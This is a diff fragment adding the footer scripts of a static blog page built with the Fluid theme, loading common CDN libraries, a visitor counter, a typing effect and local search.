+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
